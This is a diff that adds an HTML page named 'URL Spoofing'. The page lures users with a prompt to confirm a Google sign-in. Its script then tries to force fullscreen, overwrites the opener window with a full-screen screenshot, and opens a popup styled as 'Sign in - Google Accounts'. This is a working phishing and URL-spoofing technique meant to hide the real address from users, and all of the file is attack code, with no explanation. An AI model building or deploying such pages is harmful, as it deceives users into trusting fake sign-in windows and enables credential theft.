@@ -1,0 +1,107 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <title>URL Spoofing</title>
+
+    <style>
+        #button {
+            width: 150px;
+            height: 35px;
+        }
+    </style>
+
+    <script>
+        function spoof() {
+
+            const openerHTML = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+                        body {
+                            margin: 0;
+                            padding: 0;
+                        }
+                        #content {
+                            width: 100%;
+                            height: 100%;
+                            object-fit: cover;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <img id="content" src="spoof.png">
+                </body>
+                </html>
+            `;
+
+            const popupHTML = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Sign in - Google Accounts</title>
+                    <style>
+                        body {
+                            margin: 0;
+                            padding: 0;
+                        }
+                        #content {
+                            width: 100%;
+                            height: 100%;
+                            object-fit: cover;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <img id="content" src="sign.png">
+                </body>
+                </html>
+            `;
+
+            // Request fullscreen (banyak browser akan menolak ini)
+            try {
+                window.opener.document.documentElement.requestFullscreen();
+            } catch (e) {
+                console.warn("Fullscreen blocked:", e);
+            }
+
+            // Replace opener page
+            window.opener.document.open();
+            window.opener.document.write(openerHTML);
+            window.opener.document.close();
+
+            // Open popup
+            const width = 500, height = 460;
+            const top = 0;
+            const left = (screen.width / 2) - (width / 2);
+
+            const win = window.open(
+                "about:blank",
+                "second",
+                `width=${width},height=${height},top=${top},left=${left}`
+            );
+
+            if (win) {
+                win.document.open();
+                win.document.write(popupHTML);
+                win.document.close();
+            }
+
+            // Close current window
+            window.close();
+        }
+    </script>
+</head>
+
+<body>
+    <center>
+        <br>
+        <h1>
+            Please confirm you want to signin into your Google Account<br><br>
+            <button id="button" onclick="spoof();">Confirm</button>
+        </h1>
+    </center>
+</body>
+</html>
